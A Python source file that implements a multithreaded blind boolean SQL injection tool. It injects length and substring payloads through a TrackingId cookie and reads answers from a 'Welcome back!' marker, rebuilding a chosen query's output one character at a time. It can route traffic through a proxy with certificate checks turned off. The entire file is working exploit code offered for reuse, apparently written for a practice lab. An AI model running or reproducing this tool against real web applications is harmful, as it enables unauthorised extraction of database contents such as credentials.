import sys
import logging
import urllib3
import string
import concurrent.futures

import requests

import utils

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
log = logging.getLogger(__name__)

class SQLi:
    def __init__(self):
        self.max_length = 100
        self.avail_chars = string.printable
    
    def format_length_query(self, inner_query, length):
        """ override in subclass"""
        return f"zzzz' or (select length(({inner_query}))={length})-- "
    
    def format_char_query(self, inner_query, index, char):
        """override in subclass"""
        return (
            f"zzzz' or (select substring(({inner_query}), {index}, 1)=chr({char}))-- "
        )
    def is_true(self, resp):
        """override in subclass"""
        if "Welcome back!" in resp.text:
            return True
        return False
    def format_request(self, url, outer_query):
        """override in subclass"""
        cookies = {
            "TrackingId": outer_query,
        }
        request = requests.Request("GET", url, cookies=cookies)
        prepped = request.prepare()
        return prepped
    #dwdwd
    def determine_response_length(self, inner_query, url, no_proxy=False):
        log.info("Determinging response length")
        sess = requests.Session()
        for i in range(1, self.max_length):
            outer_query = self.format_length_query(inner_query, i)
            prepped = self.format_request(url, outer_query)
            if no_proxy:
                resp = sess.send(prepped)
            else:
                resp = sess.send(prepped, proxies=utils.PROXIES, verify=False)
            if self.is_true(resp):
                response_length = i
                log.info(f"Length of query response is {response_length}")
                return i
    
    
    def determine_response_char(self, task):
        sess = requests.Session()
        chars = [ord(x) for x in self.avail_chars]
        for x in chars:
            outer_query = self.format_char_query(
                task["inner_query"], task["position"], x
                )
            prepped = self.format_request(task["url"], outer_query)
            if task["no_proxy"]:
                resp = sess.send(prepped)
            else:
                resp = sess.send(prepped, proxies=utils.PROXIES, verify=False)
            if self.is_true(resp): #he
                task["result"] = str(chr(x))
                return task
    
    def format_results(self, response_chars):
        results = [
            res["result"]
            for res in sorted(response_chars, key=lambda item: item["position"])
        ]
        return "".join(results)

    def get_response_string(self, inner_query, url, no_proxy, num_threads):
        response_lenght = self.determine_response_length(inner_query, url, no_proxy) #here
        if response_lenght is None:
            log.error("Couldn't determine response length.")
            sys.exit()
        if num_threads > response_lenght:
            num_threads = response_lenght
        tasks = []
        for i in range(1, response_lenght + 1):
            result = {
                "position": i,
                "url": url, 
                "no_proxy": no_proxy, 
                "inner_query": inner_query,
                }
            tasks.append(result)    
        response_chars = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
            results = [
                executor.submit(self.determine_response_char, task) for task in tasks
                ]
            for f in concurrent.futures.as_completed(results):
                response_chars.append(f.result())
        return self.format_results(response_chars) 
